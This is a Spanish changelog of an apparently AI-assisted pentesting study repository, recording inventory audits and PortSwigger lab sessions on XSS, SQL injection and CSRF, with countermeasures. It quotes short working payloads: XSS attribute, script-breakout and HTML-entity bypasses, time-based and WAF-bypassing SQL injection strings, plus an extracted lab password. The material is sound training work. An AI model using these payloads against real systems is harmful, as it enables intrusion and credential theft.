- **AGENTS.md**: párrafo de descripción del inventario actualizado para reflejar las dos modalidades de uso del TEMPLATE (técnica concreta vs contenido conceptual) y la sintaxis de valores compuestos en Fase. Conteo (165) sigue siendo correcto: borrar el DNS duplicado y no añadir nada nuevo deja el conteo en 165 (124 técnicas + 40 INDEX + 1 TEMPLATE), igual que lo declarado.

### Hallazgos adicionales descubiertos durante la auditoría (no flageados por el review)
- **MITRE incorrecto en `inventario/03-analisis-vulnerabilidades/web/INDEX.md`**: el INDEX seguía mostrando T1185 para CSRF y T1213 para IDOR aunque los archivos de detalle ya estaban corregidos. Síntoma del review original que se quedó en archivos individuales sin auditar índices. Corregido a T1190 en ambos.
- **4 archivos más con compound values en Fase usando separadores antiguos** que el review no flagueó (sólo había revisado 2 archivos):
  - `02-enumeracion/servicios/enumeracion-docker.md`: `Enumeración / Explotación` → `Enumeración, Explotación`.
  - `02-enumeracion/servicios/enumeracion-kubernetes.md`: ídem.
  - `06-frameworks-herramientas/burp-suite/configuracion-uso-avanzado.md`: `Análisis de Vulnerabilidades | Explotación` → coma.
  - `06-frameworks-herramientas/metasploit/metasploit-avanzado.md`: 3 fases listadas con `|` → coma.
- **1 archivo con paréntesis explicativos en Plataforma** que el review no flagueó:
  - `02-enumeracion/servicios/enumeracion-ldap.md`: `Multi (principalmente Windows/Active Directory)` → `Multi`. La explicación de uso primario en Windows movida a Descripción.

### Patrón observado en el review
El review externo identificó correctamente 6 categorías de inconsistencia. Tras auditar contra el repo: 5 fixes factuales correctos, 1 caso (compound values en Fase/Plataforma) donde la "violación del template" era en realidad un síntoma de que el template no soportaba la realidad. Lección operacional: **antes de normalizar la realidad al template, comprobar si el template captura correctamente los casos legítimos**. La iteración debe ser bidireccional.

Adicionalmente, **el review tuvo coverage parcial**: encontró 2/6 archivos con compound values pero se le escaparon 4 más, y no auditó los INDEX.md (donde quedaron 2 MITRE incorrectos). Lección de meta-review: cuando un agente flaguea casos representativos de un patrón, validar que los flageados son exhaustivos antes de cerrar la auditoría. La auditoría de mi propio review encontró el doble de instancias del mismo patrón.

### Segunda iteración de review residual
Tras los fixes anteriores, segundo review crítico identificó tres hallazgos residuales:
- **TEMPLATE.md no listaba `Fundamentos` ni `Forense y DFIR` como valores válidos de Fase**, aunque archivos legítimos los usan (07-fundamentos, 08-forense-dfir). Solución: ampliar la lista en línea 7 y la nota 8 del comentario para reconocer las dos categorías de soporte como valores de Fase legítimos. Documentado con ejemplos.
- **AGENTS.md tenía un ejemplo de formato sin acentos** (`Tecnica`, `Descripcion`, `Clasificacion`, `Basica`) violando la propia regla de ortografía declarada dos líneas antes. El ejemplo además usaba `|` para compound Fase, sintaxis ya prohibida por el template. Reescrito completo con acentos correctos y nota explícita sobre compound con coma + perfil "contenido conceptual" con secciones reducidas.
- **Instrucciones del agente `revisor` y `redactor` decían "7 secciones del formato"** sin reconocer que el TEMPLATE ahora permite secciones reducidas para contenido conceptual. Reescrito para diferenciar perfiles ("técnicas concretas: 7 secciones; conceptual: 4 obligatorias + custom") y añadir 2 reglas de revisión nuevas (Fase con compound legal, ortografía del cuerpo).

Hallazgo extra de mi auditoría del review residual (no flageado por el agente): **AGENTS.md tenía 23+ palabras sin acentos repartidas por todo el archivo**, no sólo en el ejemplo de la línea 189. El review se quedó en el caso más visible. Aplicado el script sed completo, además de fixes manuales en `Edicion`, `Estandar`, `Tactica`, `taxonomia`, `precision`, `sintacticamente`, `publicacion`, `logicas`. AGENTS.md ahora 100% en español con ortografía correcta.

Patrón confirmado de la sesión: cada review identifica menos del 100% de instancias del patrón que detecta. **La auditoría tras un review siempre debe extender el patrón flageado a archivos no mencionados.**

## [2026-05-03] — Sesión 17 (Lab PortSwigger XSS stored en onclick con bypass via HTML entity)

Cuarto lab de la serie XSS Contexts y primer **stored** del path. Cambio de tipo (reflected → stored) y de contexto (literal JS dentro de `<script>` → atributo HTML event handler `onclick`). Las protecciones declaradas son las mismas que el lab "sq + backslash escaped" reflected (`<>"` HTML-encoded, `'` escapado, `\` escapado), pero el contexto destino abre una asimetría nueva: el atributo HTML pasa por **HTML decoding antes de pasar al motor JS**, así que entidades como `&apos;` aterrizan en el filtro como texto inocuo (seis chars sin `'` literal) y el navegador las decodifica a `'` viva justo antes de ejecutar. El bypass es estructuralmente idéntico al de SQLi WAF via XML hex entities (sesión 13). Solved al primer intento del payload `http://foo?&apos;-alert(1)-&apos;`.

### Añadido
- **`learning/portswigger/stored-xss-onclick-html-entity-bypass/`** — décimo writeup de `learning/portswigger/`, cuarto de XSS:
    - `writeup.md` (8 secciones): contexto exacto del reflejo (Website URL del comentario aterriza dentro de `tracker.track('...')` en `onclick` de un `<a id="author">`), explicación de la asimetría doble-decoding (HTML attribute decoding precede al parser JS, filtro server-side opera sobre input crudo), sondeo único confirmando que `&apos;` pasa intacto el filtro y aparece como `'` literal en el DOM, payload completo con trace paso a paso (filtro, HTML emitido, HTML decoding, parsing JS), explicación del operador `-` como elección minimalista para evaluar `alert` como subexpresión sin SyntaxError (vs alternativas `||`/`,`/backticks), contramedidas con énfasis en el patrón estructural correcto (atributo `data-*` + `addEventListener`, NO event handler inline), orden correcto de escape (HTML-decode antes de escape JS para cerrar la asimetría), validación de URL como tipo, CSP sin `'unsafe-inline'`, allow-list vs deny-list. Cross-link al writeup hermano del SQLi WAF bypass que usa el mismo principio.
    - `solved.png`: confirmación visual del lab solved.

### Patrón transversal observado
- **Asimetría parser/encoding** se confirma como vector recurrente de bypass cross-vulnerabilidad: SQLi via XML hex entities (sesión 13), XSS via HTML entities en event handler (este lab). El principio: el filtro inspecciona un formato, un parser intermedio lo decodifica antes de llegar al ejecutor, y el filtro nunca ve los meta-caracteres en su forma activa. Defensa común: normalizar el input al formato del ejecutor antes de aplicar reglas de filtrado.

## [2026-05-02] — Sesión 16 (Lab PortSwigger XSS JS string con angle/double-quotes encoded y single-quotes escaped)

Tercer lab de la serie XSS Contexts y complemento exacto del anterior. Mismo contexto JS-en-HTML (`var searchTerms = '...'` dentro de un `<script>` inline), pero con set de escapes invertido: `<>"` HTML-encoded (cierra la salida vía `</script>`), `'` escapado (cierra la salida directa), pero **`\` no escapado** (abre la ruta del bypass de backslash que el lab anterior cerraba). Solved al primer intento del payload. Los dos labs juntos demuestran el principio "escape consciente del contexto que cubre todos los meta-caracteres".

### Añadido
- **`learning/portswigger/reflected-xss-js-string-angle-quotes-encoded/`** — noveno writeup de `learning/portswigger/`, tercero de la categoría XSS:
    - `writeup.md` (8 secciones): tabla comparativa con el lab "sq + backslash escaped" mostrando cómo cada lab cierra justo la salida que el otro abre, los tres sondeos atómicos (`<` HTML-encoded, `'` escapado a `\'`, `\` literal sin duplicar), explicación detallada del bypass de "escape de escape" (atacante prepende `\` antes de su `'`, el filtro mete su propio `\` de escape, los dos backslashes se neutralizan entre sí en el parser JS dejando libre la `'` siguiente para cerrar el string), trace token a token del parser JS sobre `'\\';alert(1)//'`, variante oficial de PortSwigger con operador `-` en vez de `;` y por qué ambas funcionan, contramedidas con énfasis en el orden correcto de escape (primero `\`, después `'`/`"`) y el patrón idiomático `JSON.parse(json_encode(input))`, anti-patrón observado en el lab (escapar `'` sin escapar primero `\`).
    - `solved.png`: confirmación visual del lab solved.

## [2026-05-02] — Sesión 15 (Lab PortSwigger XSS en JS string con ' y \\ escapados)

Segundo lab de la serie XSS Contexts: reflejo dentro de `var searchTerms = '...'` en un bloque `<script>` inline, con escape activo de `'` y `\`. Solved al primer intento del payload. Valor pedagógico: la idea de **dos parsers en serie** (HTML + JS) que se atacan en capas distintas. El filtro escapa la sintaxis del parser interno (JS string) pero deja intacta la del externo (HTML script data state), lo que permite romper el bloque `<script>` con `</script>` literal antes de que el motor JS vea siquiera el contenido. Primer writeup del repo escrito **sin em-dashes** por preferencia explícita del usuario.

### Añadido
- **`learning/portswigger/reflected-xss-js-string-sq-backslash-escaped/`** — octavo writeup en `learning/portswigger/`, segundo de la categoría XSS:
    - `writeup.md` (8 secciones): contexto exacto del reflejo (`<script>` inline con `var searchTerms = '...'` + `document.write` que renderiza un `tracker.gif`), sondeos atómicos confirmando los dos escapes (`'` a `\'`, `\` a `\\`), tabla de payloads "desde dentro" demostrando por qué el doble escape cierra todas las salidas internas (incluido el bypass clásico `\';...//` que neutraliza el escape de comilla con un backslash propio cuando sólo hay protección de `'`), explicación detallada del modelo "dos parsers en serie" (HTML "script data state" del WHATWG vs motor JS) y la asimetría que se explota (filtro server-side escapa lo que parece sintaxis JS, deja intacto lo que es sintaxis HTML del bloque contenedor), trace paso a paso del parser HTML procesando `</script><script>alert(1)</script>` (cierra primer script, motor JS recibe string sin cerrar y lanza SyntaxError silencioso, segundo script ejecuta alert), visualización ASCII del corte HTML/JS, contramedidas con foco en patrones idiomáticos (data-* attributes + dataset, JSON.parse con json_encode, escape combinado JS+HTML escapando `<` y `>` además de `'` y `\`) más nota sobre el anti-patrón de elegir una capa de escape en vez de combinar las dos.
    - `solved.png`: confirmación visual del lab solved.

### Cambio de estilo
- Primer writeup que evita em-dashes (`—`) por preferencia del usuario, documentada en su `CLAUDE.md` global. Los seis writeups previos los siguen usando, no se tocaron retroactivamente.

## [2026-05-02] — Sesión 14 (Lab PortSwigger XSS canonical link tag — primer lab de XSS)

Cambio de familia: de SQLi a **XSS reflejado en contexto de atributo HTML**. Primer lab de la serie XSS Contexts. Solved al primer intento del payload, pero el valor pedagógico estuvo en el diagnóstico previo: **una rareza del Elements panel de Chrome** ocultó que el `href` del `<link rel="canonical">` se delimitaba con apóstrofos en el HTML crudo del servidor. La interpretación correcta sólo aparece con View Source / Network Response.

### Añadido
- **`learning/portswigger/reflected-xss-canonical-link-tag/`** — séptimo writeup en `learning/portswigger/`, primero de la categoría XSS:
    - `writeup.md` (8 secciones): objetivo y restricciones del contexto (`<link>` en `<head>`, filtro escapa `<>` pero no `'`), reconocimiento con foco en la **trampa del Elements panel de Chrome** (renormaliza atributos a `"..."` y oculta el delimitador real de `'...'` del servidor), recomendación de View Source/Network Response como ground-truth para XSS de atributo, diseño del payload alrededor de **`accesskey` + `onclick`** como par para activar elementos no visibles vía atajo de teclado (tabla de combinaciones por OS/navegador), explicación detallada del parsing apóstrofo a apóstrofo del HTML crudo (cada `'` como toggle abrir/cerrar atributo, 6 apóstrofos → 3 atributos legítimos en el DOM final), payload `'accesskey='x'onclick='alert(1)`, contramedidas con foco en output encoding context-aware (no basta `<>`, hay que escapar el delimitador del atributo) + CSP estricta + no reflejar query string en canonical URLs.
    - `solved.png`: confirmación visual del lab solved.



Sesión continuando la serie SQLi de PortSwigger: cambio de tipo de lab de blind a **UNION-based con WAF + bypass via XML hex entities**. Solved al primer intento. Aprovechamos para añadir al inventario dos huecos nuevos: la distinción numeric/string SQLi y la categoría completa de WAF bypass (encoding asimétrico + bypasses a nivel SQL).

### Añadido
- **`learning/portswigger/sqli-filter-bypass-xml-encoding/`** — sexto writeup en el directorio `learning/portswigger/`. Construido iterativamente:
    - `writeup.md` (10 secciones): objetivo y cambio de patrón (de cookie a body XML, de blind a UNION-based con WAF), recon del endpoint `/product/stock` con `Content-Type: application/xml`, **sondeo aritmético `3-1` para confirmar numeric SQLi sin tocar keywords del WAF** (técnica didácticamente clave: pasa por debajo del radar del WAF de patrones), confirmación del WAF con respuestas 403 "Attack detected" en `'` y `UNION`, explicación de la asimetría WAF-vs-parser (WAF inspecciona wire format, backend ve XML parseado) que habilita el bypass, construcción del bypass mínimo encodeando sólo la primera letra de las keywords (`&#x55;NION &#x53;ELECT`) más las comillas (`&#x27;`), validación con `UNION SELECT NULL` (200 OK + body con `null`) y descubrimiento bonus de que el endpoint imprime todos los rows del result set (permite extraer toda la tabla en una request), extracción con `username||'~'||password FROM users`, login admin, contramedidas específicas (parametrización, validación de tipo numeric en valores XML, WAFs que parsean el formato antes de aplicar reglas, allow-list).
    - `solved.png`: confirmación visual del lab solved.

### Actualizado
- **`inventario/03-analisis-vulnerabilidades/web/analisis-sql-injection.md`**:
    - **Bloque nuevo "Sondeo previo — numeric vs string SQLi"** al inicio de "Comandos / Ejemplos", explicando la distinción y proponiendo el test aritmético (`3-1`) y el test de comilla como sondeos complementarios. Útil contexto antes de los 6 tipos de inyección.
    - **Nueva sección 6 "WAF Bypass — Encoding asimétrico"** después de load_file. Documenta el patrón general (WAF inspecciona wire format, parser decodea), tabla de esquemas de encoding por formato del body (XML entities, JSON unicode escapes, URL-encoding, multipart Content-Transfer-Encoding, gzip), ejemplo XML completo con bypass mínimo vs agresivo, y bloque de bypasses a nivel SQL (comentarios inline `UN/**/ION`, whitespace alternativo `%09`/`%0a`/`/**/`, equivalencias semánticas `&&`/`||`/`MID`/`IIF`). Cierra con heurística de orden de prueba.
    - Referencias ampliadas con el nuevo writeup.
- **`inventario/04-explotacion/web/explotacion-sqli.md`**:
    - Sondeo aritmético `3-1` añadido al bloque "Pruebas manuales básicas" como primer test antes del bypass clásico de login.
    - Bloque XML hex entities bypass añadido después del bloque OOB, con bypass mínimo vs agresivo + bloque adicional de bypasses SQL-level (comentarios inline, whitespace alternativo, equivalencias semánticas) y heurística de orden de prueba.
    - Referencias ampliadas con el nuevo writeup.

## [2026-04-29] — Sesión 12 (Lab PortSwigger OOB + categoría OOB en inventario)

Sesión continuando la serie de blind SQLi: lab de **out-of-band interaction** (Oracle, XXE via `xmltype`). El lab no se cerró como **Solved** porque PortSwigger Academy bloquea outbound hacia cualquier dominio distinto de `*.oastify.com` (Burp Pro Collaborator, no disponible). El conocimiento técnico y el diagnóstico se capturan igualmente: la categoría OOB queda añadida al inventario como cuarta familia blind, y el writeup documenta tanto la técnica como la limitación operacional encontrada.

### Añadido
- **`learning/portswigger/blind-sqli-out-of-band/`** — quinto writeup en el directorio `learning/portswigger/`. No solved (limitación operacional), pero pedagógicamente valioso:
    - `writeup.md` (9 secciones): objetivo, motivo del cambio de motor a Oracle (XXE via `xmltype` es Oracle-específico), tabla de primitivas OOB por motor, setup de **interactsh-client** como receptor OAST gratuito (alternativa a Burp Collaborator), construcción del payload Oracle XXE pieza por pieza, **diagnóstico sistemático** ante la falta de interacciones (descarte de Burp HTTP/2 con curl, descarte de `+` vs `%20`, descarte de XXE-específico probando `UTL_HTTP.REQUEST` y `UTL_INADDR.GET_HOST_ADDRESS`, descarte de cookie no procesada), hallazgo final del **firewall de PortSwigger Academy que sólo permite `*.oastify.com`** (citado del statement del lab que pasamos por alto al empezar — lección meta sobre leer las notas completas antes de inyectar), conclusión de que el lab requiere Burp Pro, contramedidas específicas de OOB (egress filtering en el host de la DB, deshabilitar resolvers de entidades externas en parsers XML, privilegios mínimos sobre `UTL_HTTP`/`UTL_INADDR`/`xp_dirtree`).

### Actualizado
- **`inventario/03-analisis-vulnerabilidades/web/analisis-sql-injection.md`** — **nueva sección 4 "Inyección Fuera de Banda (Out-of-Band / OAST)"** insertada entre time-blind y load_file (antes el archivo cubría sólo error/boolean/time + load_file; OOB era un hueco evidente). Incluye: cuándo aplica (queries async fire-and-forget que cierran los tres canales clásicos), tabla de primitivas OOB por motor (Oracle XXE+UTL_HTTP+UTL_INADDR+DBMS_LDAP, MS SQL `xp_dirtree`, MySQL `LOAD_FILE`+`OUTFILE` Windows, PostgreSQL `COPY TO PROGRAM`), ejemplo Oracle XXE completo con explicación del orden de evaluación (`xmltype()` resuelve la entidad antes de llegar a `EXTRACTVALUE`), tabla de receptores OAST (Burp Collaborator vs interactsh vs DNSLog vs servidor propio) con coste y caso de uso, nota operacional sobre allowlists de OAST (PortSwigger Academy `*.oastify.com` only). Referencias ampliadas con el nuevo writeup.
- **`inventario/04-explotacion/web/explotacion-sqli.md`** — bloque OOB añadido a "Pruebas manuales", paralelo a los bloques error-based y time-based de sesiones anteriores. Cubre Oracle XXE + alternativas, MS SQL `xp_dirtree`, MySQL Windows. Incluye ejemplo URL-encodeado del payload XXE para cookie, comando de instalación de `interactsh-client` y nota sobre allowlists OAST en entornos de prácticas. Referencias actualizadas con los dos writeups que faltaban (info-retrieval y out-of-band).

## [2026-04-29] — Sesión 11 (Lab PortSwigger time-delays info retrieval + script de extracción)

Sesión continuando la serie de blind SQLi: del lab anterior (sólo provocar retardo) al lab "info-retrieval" donde hay que **extraer la password** de `administrator` por inferencia carácter a carácter via `CASE WHEN ... pg_sleep ... ELSE pg_sleep(0) END`. Pivote operacional clave: descartar Burp Intruder (1 thread en Community → ~6 min) y scriptear la extracción en Python con `ThreadPoolExecutor` (~1 min real medido).

### Añadido
- **`learning/portswigger/blind-sqli-time-delays-info-retrieval/`** — cuarto writeup en el directorio `learning/portswigger/`. Construido iterativamente durante la sesión:
    - `writeup.md` (8 secciones): objetivo y diferencia con el lab base, **validación de las dos ramas del `CASE` antes de extraer** (test `(1=1)` → 10s, test `(1=2)` → baseline; sin esto los falsos positivos invalidarían toda la extracción), determinación de longitud (`LENGTH(password)=20` → 10s confirma 20 chars), narrativa del pivote Burp Intruder → script Python con análisis del coste real (~6 min Community vs 67s medidos con 10 workers, sleep=5s, threshold=3s) y discusión de por qué no escala linealmente (serialización de `pg_sleep` en el pool de conexiones de la DB), resumen con diagrama Mermaid y contramedidas específicas para extracción time-based (`statement_timeout` corto como contramedida quirúrgica, rate limiting, decorrelación tiempo-de-respuesta vs tiempo-de-backend).
    - `extract.py`: script funcional autocontenido (~80 líneas). Usa `requests` + `concurrent.futures.ThreadPoolExecutor`, encodea la cookie con `urllib.parse.quote_plus` (resuelve `;` → `%3B`, `'` → `%27`, espacios → `+` de un golpe), imprime hits en streaming, parametrizable por `--url`, `--session` y `--workers`.
    - `solved.png`: confirmación visual del lab resuelto (login con la password extraída `jyuepelyogm45rdshesl`).

### Actualizado
- **`inventario/04-explotacion/web/explotacion-sqli.md`** — añadida nota operacional al final del bloque time-based: paralelismo en extracción time-based, limitación de Burp Community (1 thread), patrón `requests + ThreadPoolExecutor` con cuello de botella en el pool de conexiones de la DB, link al writeup como implementación de referencia.

## [2026-04-29] — Sesión 10 (Lab PortSwigger + enriquecimiento SQLi time-based)

Sesión de aprendizaje guiada paso a paso resolviendo el lab de PortSwigger **"Blind SQL injection with time delays"**, con captura del conocimiento operativo derivado en el inventario.

### Añadido
- **`learning/portswigger/blind-sqli-time-delays/`** — tercer writeup en el directorio `learning/portswigger/`. Construido iterativamente durante la sesión:
    - `writeup.md` (8 secciones): objetivo, baseline cuantificado (~185ms estable), descarte explícito de canales más cómodos (test `'` suelto sin error reflejado → no error-based; `AND '1'='1` vs `AND '1'='2` con respuestas idénticas → no boolean-based) que justifica el salto a tiempo, payload final con stacked queries (`x'%3BSELECT+pg_sleep(10)--`) con explicación pieza por pieza, **detalle didáctico del `;` como delimitador de cookies y la necesidad de URL-encodearlo como `%3B`** (gotcha específico de inyectar en headers Cookie), tabla de primitivos de retardo por motor (PG `pg_sleep`, MySQL `SLEEP`, MS SQL `WAITFOR DELAY`, Oracle `dbms_pipe.receive_message`, SQLite con queries pesadas), variantes equivalentes (concat `||`, cláusula `AND`), resumen con diagrama Mermaid y contramedidas (statement_timeout, deshabilitar multi-statement, monitoreo de latencia anómala).
    - `solved.png`: confirmación visual del lab resuelto al primer intento.

### Actualizado
- **`inventario/03-analisis-vulnerabilidades/web/analisis-sql-injection.md`** — sección 3 "Inyección Ciega Basada en Tiempo" reescrita y ampliada. Antes solo listaba MySQL `SLEEP` y el patrón complejo PostgreSQL `CASE WHEN ... pg_sleep ... ELSE pg_sleep END`; ahora documenta tabla de primitivos por motor (PG/MySQL/MSSQL/Oracle/SQLite), las tres formas de inyectar el sleep (stacked queries `;`, concat `||`, cláusula `AND`) según qué tolere el sink, el patrón `CASE WHEN` reservado explícitamente para inferencia bit a bit, ejemplos de inferencia en PG/MySQL/MS SQL, y nota sobre el `;` URL-encoded cuando el sink es header Cookie. Mención del baseline como pre-requisito metodológico. Referencias ampliadas con el nuevo writeup.
- **`inventario/04-explotacion/web/explotacion-sqli.md`** — bloque "Pruebas manuales básicas" extendido con un nuevo bloque dedicado a payloads time-based, paralelo al de error-based añadido en sesión 9. Cubre los 5 motores principales, payload de inferencia con `CASE WHEN`, gotcha del `;` URL-encoded en cookies, y ejemplo de `sqlmap --technique=T --time-sec=5`. Referencias con enlace al writeup.

## [2026-04-29] — Sesión 9 (Lab PortSwigger + enriquecimiento SQLi error-based)

Sesión de aprendizaje guiada paso a paso resolviendo el lab de PortSwigger **"Visible error-based SQL injection"**, con captura del conocimiento operativo derivado en el inventario.

### Añadido
- **`learning/portswigger/visible-error-based-sql-injection/`** — segundo writeup en el directorio `learning/portswigger/`. Construido iterativamente durante la sesión:
    - `writeup.md` (8 secciones): objetivo, provocación del primer error con la nota didáctica `'` solo vs `' --` (la trampa típica donde el `--` cierra y comenta — no rompe — la query), salto de error de sintaxis a exfiltración con la técnica `CAST(<subquery> AS int)`, descubrimiento del **truncado de la cookie a 60 chars server-side** y workaround con concatenación `||` para meter el `CAST` dentro del string del `WHERE`, lectura de `users.password` con `LIMIT 1`, login como administrator, resumen de la cadena con diagrama Mermaid, contramedidas y referencias APA.
    - `solved.png`: confirmación visual del lab resuelto.

### Actualizado
- **`inventario/03-analisis-vulnerabilidades/web/analisis-sql-injection.md`** — sección 1 "Inyección Basada en Error" reescrita y ampliada. Antes solo listaba el clásico MySQL `COUNT/GROUP BY/FLOOR(RAND())`; ahora documenta el primitivo más limpio (`CAST` en PostgreSQL/SQLite que vuelca el valor en `ERROR: invalid input syntax for type integer`) con sus equivalentes por motor (`CONVERT` en MS SQL, `TO_NUMBER` en Oracle, `extractvalue()` XPath en MySQL), añade la variante con concatenación `||` para casos con límite de longitud en el punto de inyección, y deja el payload `COUNT/GROUP BY` como fallback explícito. Referencias ampliadas con PortSwigger Blind SQLi y enlace al writeup como evidencia.
- **`inventario/04-explotacion/web/explotacion-sqli.md`** — bloque "Pruebas manuales básicas" extendido de un solo payload (MySQL clásico) a cinco variantes comentadas: PostgreSQL/SQLite con `CAST AND` clásico, PostgreSQL/Oracle/SQLite con concatenación `||`, MS SQL con `CONVERT/TOP 1`, MySQL con `extractvalue`, y el `COUNT/GROUP BY` original como fallback. Referencias con enlace al writeup.

## [2026-04-28] — Sesión 8 (Lab PortSwigger + enriquecimiento CSRF)

Sesión de aprendizaje guiada paso a paso resolviendo el lab de PortSwigger **"SameSite Lax bypass via cookie refresh"**, con captura del conocimiento operativo derivado en el inventario.

### Añadido
- **`learning/portswigger/samesite-lax-bypass-via-cookie-refresh/`** — primer writeup en el directorio `learning/portswigger/`. Construido iterativamente durante la sesión:
    - `writeup.md` (~600 líneas, 10 secciones): objetivo, reconocimiento del flujo OAuth con diagrama de secuencia Mermaid y 5 observaciones extraídas del Burp history, fundamentos de CSRF con verificación de los 3 ingredientes, explicación de SameSite (los 3 modos + excepción Lax+POST de Chrome), construcción incremental del exploit en 4 versiones (V1 ingenuo → V4 con click programático en `onload`), entrega, troubleshooting, contramedidas y referencias APA.
    - `http_history.xml` y `change-email.xml`: capturas Burp del flujo OAuth y del POST legítimo, citadas como evidencia en el writeup.
    - `exploit.html`: payload V4 final listo para subir al exploit server.
    - `solved.png`: confirmación visual de que el lab quedó resuelto al primer intento.

### Actualizado
- **`inventario/03-analisis-vulnerabilidades/web/analisis-csrf.md`** — añadida sección **Bypasses de SameSite** con dos técnicas documentadas (ventana Lax+POST de 2 min en Chrome, cookie refresh via OAuth/SSO) y referencia breve a otros bypasses conocidos (method override, client-side redirect, sibling domain). Sección de Contramedidas reforzada con guía explícita: tokens anti-CSRF como defensa principal (no `SameSite`), fijar `SameSite` explícito para evitar el modo default que activa Lax+POST, no emitir cookies nuevas en endpoints navegables sin gesto del usuario. Referencias ampliadas con PortSwigger, Chromium SameSite Updates, MDN y OWASP CSRF Cheat Sheet.

## [2026-04-28] — Sesión 7 (Pasada de consistencia)

Auditoría y limpieza del warehouse para dejarlo en estado íntegro y honesto, motivada por el descubrimiento de **96 archivos** con referencias rotas a `notas-md/` (directorio que ya no existe en disco). El objetivo: que cualquier agente que consulte el inventario reciba información verificable y un mapa de navegación íntegro.

### Limpieza
- **Refs rotas a `notas-md/` eliminadas en 96 archivos del inventario**. `notas-md/` fue el export Notion usado para bootstrapear el inventario en 2025; el contenido relevante ya está absorbido en los archivos `analisis-*.md` / `explotacion-*.md` / etc. Las refs apuntando a `notas-md/HNotes/...` se eliminaron mecánicamente con `sed '/^- Notas del proyecto: notas-md\//d'`, preservando intactas las referencias bibliográficas a libros, MITRE, HackTricks y demás. Las 2 refs vivas a `learning/tryhackme/...` (verificadas como archivos existentes) se conservaron.
- **`inventario/TEMPLATE.md`** — removida la línea de ejemplo `Para notas: Notas del proyecto: notas-md/ruta/al/archivo.md` del comentario para redactor, evitando que se propague el patrón muerto a archivos nuevos.

### Actualizado
- **`AGENTS.md`** — reescrita la sección `Fuentes de Información` para reflejar la realidad actual. La nueva sección 1 describe `inventario/` como fuente canónica (165 archivos) con la jerarquía de 3 niveles de `INDEX.md` explícitamente documentada (root → fase → subcategoría). Se añadió una nota histórica explicando el origen y archivado de `notas-md/`. Actualizadas además: protocolo de búsqueda local (paso 1), `Heurísticas de Prioridad` (Prioridad 3), `Resolución de Conflictos` (duplicados), instrucciones del agente `investigador`, y `Paso 1 — Investigación` del Workflow Probado, todas para dejar de referenciar el directorio inexistente.

### Añadido
- **`inventario/07-fundamentos/sistemas/INDEX.md`** — añadida fila `Windows API para Hacking | Intermedia` que existía en el dir desde antes pero no estaba listada en el INDEX.
- **`inventario/07-fundamentos/compliance/INDEX.md`** — creado placeholder informativo enumerando tópicos esperados (CVSS v3/v4, OWASP ASVS, NIST CSF, ISO 27001/27002, MITRE D3FEND, GDPR). El dir existía vacío sin INDEX, rompiendo el contrato de la jerarquía navegable.
- **`inventario/07-fundamentos/INDEX.md`** — añadida entrada para la subcategoría `Compliance` marcada como `(pendiente de contenido)`.

### Verificado post-pass
Auditoría de integridad completa, todos los chequeos limpios:
- 0 referencias rotas a `notas-md/` en el inventario.
- 0 desincronizaciones tier-3 (todos los archivos `*.md` están listados en su INDEX de subcategoría).
- 0 desincronizaciones tier-2 (todas las subcategorías están listadas en el INDEX de su fase).
- 0 directorios sin INDEX.
- 166 archivos `.md` totales (165 previos + 1 nuevo en compliance).

## [2026-04-07] — Sesión 6 (FINALIZACIÓN DEL PROYECTO)

### Añadido
- **Fase 06 - Frameworks y Herramientas** — 4 guías avanzadas:
    - **burp-suite/**: `configuracion-uso-avanzado.md` (Scope, Intruder, Macros de sesión).
    - **metasploit/**: `metasploit-avanzado.md` (Workspaces, Resource files, Post-exploitation).
    - **powershell-empire/**: `empire-framework.md` (Listeners, Stagers, C2 workflow).
    - **otros/**: `bloodhound.md` (SharpHound, Graph theory, AD attack paths).
- **Fase 07 - Fundamentos** — 4 guías base:
    - **redes/**: `modelo-osi-tcp-ip.md` (PDU, Three-Way Handshake, Comandos de diagnóstico).
    - **sistemas/**: `linux-arquitectura-permisos.md` (FHS, Permisos rwx, SUID/SGID, Gestión de procesos).
    - **sistemas/**: `windows-arquitectura-ad.md` (Procesos críticos,lsass, Kerberos/NTLM, Fundamentos AD).
    - **criptografia/**: `hashing-codificacion.md` (Diferencias Codificación/Hash/Cifrado, Algoritmos, Herramientas).
- **Fase 08 - Forense y DFIR** — 4 guías de investigación:
    - **analisis-forense/**: `artefactos-windows-host.md` (Prefetch, ShimCache, LNK, Eric Zimmerman's tools).
    - **analisis-forense/**: `volatility-memoria.md` (Adquisición RAM, netscan, malfind, procdump).
    - **incident-response/**: `metodologia-picerl.md` (Fases SANS, Contención vs Erradicación, SIEM/EDR).
    - **malware-analysis/**: `analisis-estatico-dinamico.md` (Hashing, Strings, PE analysis, YARA rules, Sandboxing).
- **Fase 09 - Sistema de Índices** — Implementación de navegación recursiva:
    - Creado `inventario/INDEX.md` maestro con enlaces a todas las fases.
    - Creados archivos `INDEX.md` en cada una de las 8 carpetas de fase y sus 20 subcarpetas de categoría.
    - Tablas de referencia rápida con MITRE IDs y dificultad en cada nivel de subcategoría.

### Actualizado
- **Estado del Proyecto**: Todas las fases del roadmap original han sido completadas con éxito.
- **TASKS.md**: Archivo eliminado tras la consecución de todos los objetivos.

---

## [2026-03-27] — Sesión 5

### Añadido
- **Fase 05 - Post-Explotación** — 20 técnicas nuevas:
    - **privilege-escalation/linux/** (7): `suid-sgid.md`, `abuso-sudo.md`, `abuso-cron-jobs.md`, `capabilities-linux.md`, `kernel-exploits-privesc-linux.md`, `nfs-no-root-squash.md`, `enumeracion-privesc-linux.md`
    - **privilege-escalation/windows/** (5): `token-impersonation.md`, `credential-dumping.md`, `abuso-servicios-windows.md`, `abuso-tareas-programadas.md`, `enumeracion-privesc-windows.md`
    - **persistencia/** (3): `persistencia-linux.md`, `persistencia-windows.md`, `web-shells.md`
    - **lateral-movement/** (3): `pass-the-hash.md`, `pivoting-tunneling.md`, `ejecucion-remota-windows.md`
    - **exfiltracion/** (2): `canales-encubiertos.md`, `transferencia-archivos.md`

### Corregido
- Edición incorrecta del libro de Allen en 7 archivos: corregido de "(4th ed.)" a "(2nd ed.)" según el PDF existente en `referencias/`
- Formato de entrada de herramientas LOLBAS en `enumeracion-privesc-linux.md`

### Actualizado
- Tabla de libros en `AGENTS.md` ordenada alfabéticamente por título

---

## [2026-03-24] — Sesión 4

### Añadido
- **Biblioteca de Referencias**: Incorporados 17 nuevos PDFs a la carpeta `referencias/` (total 33 libros), incluyendo *The Web Application Hacker's Handbook*, *Black Hat GraphQL* y *Wireshark 2 Cookbook*.
- **AGENTS.md**: Actualizada la tabla de fuentes de información para incluir los 33 libros categorizados por área técnica.

### Actualizado (Enriquecimiento Técnico)
- **Fase 03 - Análisis de Vulnerabilidades Web** (4 técnicas clave):
